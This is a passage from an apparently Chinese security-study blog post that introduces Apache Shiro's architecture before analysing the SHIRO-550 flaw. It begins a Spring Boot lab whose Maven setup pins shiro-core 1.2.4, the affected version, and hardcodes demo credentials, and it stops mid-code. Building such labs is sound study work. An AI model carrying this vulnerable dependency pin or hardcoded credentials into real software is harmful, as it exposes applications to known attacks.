    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h2>
<p>之前参加过护网的面试，总喜欢问<code>shiro-550</code>漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一个很重要的Java安全框架，这里也就跟进学习一下shiro存在的一些历史漏洞。</p>
<p>根据官方网站上的<a href="https://shiro.apache.org/security-reports.html">漏洞通报</a>，<code>Shiro</code> 在历史上共通报了 <code>11</code> 个 <code>CVE</code>，除了 <code>SHIRO-550</code> 和<code>SHIRO-721</code>的反序列化以及 CVE-2014-0074 的 ldap 绕过之外，其他的绕过都是在路径处理过程中产生问题导致的绕过。</p>
<p>这些绕过多数是由于 shiro 的处理逻辑有误，或和中间件、其他框架的处理逻辑不一致导致的安全问题，通常会依赖场景。</p>
<p>这里就先对最简单的<code>shrio-550</code>以契子进行学习,同时简单学习一下<code>Shiro</code>具体是什么东西。</p>
<h2 id="shiro简单介绍">Shiro简单介绍<a hidden class="anchor" aria-hidden="true" href="#shiro简单介绍">#</a></h2>
<h3 id="shiro主要实现功能">Shiro主要实现功能<a hidden class="anchor" aria-hidden="true" href="#shiro主要实现功能">#</a></h3>
<p><a href="https://shiro.apache.org/">Apache Shiro</a> 是一个 Java 安全框架，包括如下功能和特性：</p>
<ul>
<li><a href="https://shiro.apache.org/authentication-features.html">Authentication</a>：身份认证/登陆，验证用户是不是拥有相应的身份。在 Shiro 中，所有的操作都是基于当前正在执行的用户，这里称之为一个 <code>Subject</code>，在用户任意代码位置都可以轻易取到这个<code>Subject</code>。Shiro 支持数据源，称之为 <code>Realms</code>，可以利用其连接 LDAP\AD\JDBC 等安全数据源，并支持使用自定义的 <code>Realms</code>，并可以同时使用一个或多个 <code>Realms</code> 对一个用户进行认证，认证过程可以使用配置文件配置，无需修改代码。同时，Shiro 还支持 RememberMe，记住后下次访问就无需登录。</li>
<li><a href="https://shiro.apache.org/authorization-features.html">Authorization</a>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限。同样基于 <code>Subject</code>、支持多种 <code>Realms</code>。Shiro 支持 <code>Wildcard Permissions</code> ，也就是使用通配符来对权限验证进行建模，使权限配置简单易读。Shiro 支持基于 <code>Roles</code> 和基于 <code>Permissions</code> 两种方式的验证，可以根据需要进行使用。并且支持缓存产品的使用。</li>
<li><a href="https://shiro.apache.org/session-management-features.html">Session Manager</a>：会话管理，用户登陆后就是一次会话，在没有退出之前，它的所有信息都在会话中。Shiro 中的一切（包括会话和会话管理的所有方面）都是基于接口的，并使用 POJO 实现，因此可以使用任何与 JavaBeans 兼容的配置格式（如 JSON、YAML、Spring XML 或类似机制）轻松配置所有会话组件。Session 支持缓存集群的方式；还支持事件侦听器，允许在会话的生命周期内侦听生命周期事件，以执行相关逻辑。Shiro Sessions 保留发起会话的主机的 IP 地址，因此可以根据用户位置来执行不同逻辑。Shiro 对 Web 支持实现了 <code>HttpSession</code> 类及相关全部 API。也可以在 SSO 中使用。</li>
<li><a href="https://shiro.apache.org/cryptography-features.html">Cryptography</a>：加密，保护数据的安全性；Shiro 专注于使用公私钥对数据进行加密，以及对密码等数据进行不可逆的哈希。</li>
<li><a href="https://shiro.apache.org/permissions.html">Permissions</a>：用户权限；Shiro 将所有的操作都抽象为 Permission，并默认使用 <code>Wildcard Permissions</code> 来进行匹配。Shiro 支持实例级别的权限控制校验，例如<code>domain:action:instance</code>。</li>
<li><a href="https://shiro.apache.org/caching.html">Caching</a>：缓存，为了提高 Shiro 在业务中的性能表现。Shiro 的缓存支持基本上是一个封装的 API，由用户自行选择底层的缓存方式。缓存中有三个重要的接口 <code>CacheManager</code>/<code>Cache</code>/<code>CacheManagerAware</code> ，Shiro 提供了默认的 <code>MemoryConstrainedCacheManager</code> 等实现。</li>
</ul>
<h3 id="shiro主要的类">shiro主要的类<a hidden class="anchor" aria-hidden="true" href="#shiro主要的类">#</a></h3>
<p>Shiro 架构中主要有三个核心的概念：Subject, SecurityManager, Realms。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20210418162523103.png" alt="image-20210418162523103"  />
</p>
<p><strong>Subject</strong>：代表当前的用户</p>
<p><strong>SecurityManager</strong>：管理者所有的 Subject ，在官方文档中描述其为 Shiro 架构的核心</p>
<p><strong>Realms</strong>：SecurityManager的认证和授权需要使用Realm，Realm负责获取用户的权限和角色等信息，再返回给SecurityManager来进行判断，在配置 Shiro 的时候，我们必须指定至少一个Realm 来实现认证（authentication）和/或授权（authorization）</p>
<p>对于Shiro来说，一次认证及授权的校验流程：</p>
<ol>
<li>应用程序通过获取当前访问的 Subject（也就是用户），并调用其相应校验方法；</li>
<li>Subject 将校验委托给 SecurityManager 进行判断；</li>
<li>SecurityManager 会调用 Realm 来获取信息来判断用户对应的角色能否进行操作。</li>
</ol>
<h4 id="securitymanager">SecurityManager<a hidden class="anchor" aria-hidden="true" href="#securitymanager">#</a></h4>
<p><code>org.apache.shiro.mgt.SecurityManager</code> 是 shiro 的一个核心接口，接口负责了一个 Subject 也就是“用户”的全部安全操作：</p>
<ul>
<li>接口本身定义了 <code>createSubject</code>、<code>login</code>、<code>logout</code> 三个方法用来创建 Subject、登陆和退出。</li>
<li>扩展了 <code>org.apache.shiro.authc.Authenticator</code> 接口，提供了 <code>authenticate</code> 方法用来进行认证。</li>
<li>扩展了 <code>org.apache.shiro.authz.Authorizer</code> 接口，提供了对 Permission 和 Role 的校验方法。包括 <code>has/is/check</code> 相关命名的方法。</li>
<li>扩展了 <code>org.apache.shiro.session.mgt.SessionManager</code> 接口，提供了 <code>start</code>、<code>getSession</code> 方法用来创建可获取会话。</li>
</ul>
<p>Shiro 为 SecurityManager 提供了一个包含了上述所有功能的默认实现类 <code>org.apache.shiro.mgt.DefaultSecurityManager</code>，中间继承了很多中间类，并逐层实现了相关的方法，继承关系如下图。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319141748366.png" alt="image-20230319141748366"  />
</p>
<p>DefaultSecurityManager 还有一个子类，就是 <code>org.apache.shiro.web.mgt.DefaultWebSecurityManager</code>，这个类在 shiro-web 包中，是 Shiro 为 HTTP/SOAP 等 http 协议连接提供的实现类，这个类默认创建配置了 <code>org.apache.shiro.web.mgt.CookieRememberMeManager</code> 用来提供 RememberMe 相关功能。</p>
<blockquote>
<p>我们如果使用<code>spring</code>或者<code>springboot</code>等框架进行整合<code>Shiro</code>的时候，在设定<code>SecurityManager</code>对应的<code>Realm</code>时，需要声明使用的类为:<code>DefaultWebSecurityManager</code>。</p>
</blockquote>
<h4 id="subject">Subject<a hidden class="anchor" aria-hidden="true" href="#subject">#</a></h4>
<p><code>org.apache.shiro.subject.Subject</code> 是一个接口，用来表示在 Shiro 中的一个用户。因为在太多组件中都使用了 <code>User</code> 的概念，所以 Shiro 故意避开了这个关键字，使用了 <code>Subject</code>。</p>
<p>Subject 接口同样提供了认证（login/logout）、授权（访问控制 has/is/check 方法）以及获取会话的能力。在应用程序中如果想要获取一个当前的 Subject，通常使用 <code>SecurityUtils.getSubject()</code> 方法即可。</p>
<p>实际上，Subject 接口在 core 包中的实现类 <code>org.apache.shiro.subject.support.DelegatingSubject</code> 本质上也就是一个 SecurityManager 的代理类。</p>
<p>DelegatingSubject 中保存了一个 transient 修饰的 SecurityManager 成员变量，在使用具体的校验方法时，实际上委托 SecurityManager 进行处理，如下图：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319142351444.png" alt="image-20230319142351444"  />
</p>
<p>DelegatingSubject 中不会保存和维持一个用户的“状态（角色/权限）”，恰恰相反，每次它都依赖于底层的实现组件 SecurityManager 进行检查和校验，因此通常会要求 SecurityManager 的实现类来提供一些缓存机制。</p>
<h4 id="realm">Realm<a hidden class="anchor" aria-hidden="true" href="#realm">#</a></h4>
<p><code>org.apache.shiro.realm.Realm</code> 是 Shiro 中的一个接口，Shiro 通过 Realm 来访问指定应用的安全实体——用户、角色、权限等。一个 Realm 通常与一个数据源有 1 对 1 的对应关系，如关系型数据库、文件系统或者其他类似的资源。</p>
<p>实际上，一个<code>Subject</code>查询是否权限、角色的时候，是交付给底层的<code>SecurityManager</code>，而<code>SecurityManager</code>是通过其设定的<code>Realm</code>中定义的规则、权限来实现授权、认证的。</p>
<p>在使用中，开发人员通常不会直接实现 Realm 接口，而是实现 Shiro 提供了一些相关功能的抽象类 AuthenticatingRealm/AuthorizingRealm，或者使用针对特定数据源提供的实现类如 JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm 等等。继承关系大概如下：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319142900034.png" alt="image-20230319142900034"  />
</p>
<p>较多情况下，开发人员会自行实现 <code>AuthorizingRealm</code> 类，并重写 <code>doGetAuthorizationInfo</code>/<code>doGetAuthenticationInfo</code> 方法来自行实现自身的认证和授权逻辑。</p>
<h3 id="shiro简单使用">Shiro简单使用<a hidden class="anchor" aria-hidden="true" href="#shiro简单使用">#</a></h3>
<p>为了简化操作的流程，我们这里直接使用springboot进行整合<code>Shiro</code>。</p>
<p>通过<code>maven</code>导入相关依赖：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-web<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>1.6.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;version&gt;</span>1.2.4<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-spring<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>1.4.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后定义我们自己的授权、认证的<code>Realm</code>。</p>
<ul>
<li>认证的用户账户名为<code>reus09</code>,密码为<code>password</code>。</li>
<li>并且其拥有两个<code>Role</code>:<code>admin</code>,<code>user</code>。</li>
<li><code>admin</code>拥有<code>add</code>权限，<code>user</code>拥有<code>delete</code>权限。</li>
</ul>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">76
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> MyShiroRealm <span style="color:#fff;font-weight:bold">extends</span> AuthorizingRealm {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * 模拟数据库数据
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    Map&lt;String, String&gt; userMap = <span style="color:#fff;font-weight:bold">new</span> HashMap&lt;&gt;(<span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        userMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;123456&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">super</span>.<span style="color:#007f7f">setName</span>(<span style="color:#0ff;font-weight:bold">&#34;myShiroRealm&#34;</span>); <span style="color:#007f7f">// 设置自定义Realm的名称，取什么无所谓..
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * 授权
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param principalCollection
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {
</span></span><span style="display:flex;"><span>        String userName = (String) principalCollection.<span style="color:#007f7f">getPrimaryPrincipal</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; roles = getRolesByUserName(userName);
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; permissions = getPermissionsByUserName(userName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        SimpleAuthorizationInfo simpleAuthorizationInfo = <span style="color:#fff;font-weight:bold">new</span> SimpleAuthorizationInfo();
</span></span><span style="display:flex;"><span>        simpleAuthorizationInfo.<span style="color:#007f7f">setRoles</span>(roles);
</span></span><span style="display:flex;"><span>        simpleAuthorizationInfo.<span style="color:#007f7f">setStringPermissions</span>(permissions);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> simpleAuthorizationInfo;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * 模拟从数据库中获取权限数据
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     *
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param userName
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Set&lt;String&gt; getPermissionsByUserName(String userName) {
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; permissions = <span style="color:#fff;font-weight:bold">new</span> HashSet&lt;&gt;();
</span></span><span style="display:flex;"><span>        permissions.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;user:delete&#34;</span>);
</span></span><span style="display:flex;"><span>        permissions.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;admin:add&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> permissions;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * 模拟从数据库中获取角色数据
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     *
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param userName
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Set&lt;String&gt; getRolesByUserName(String userName) {
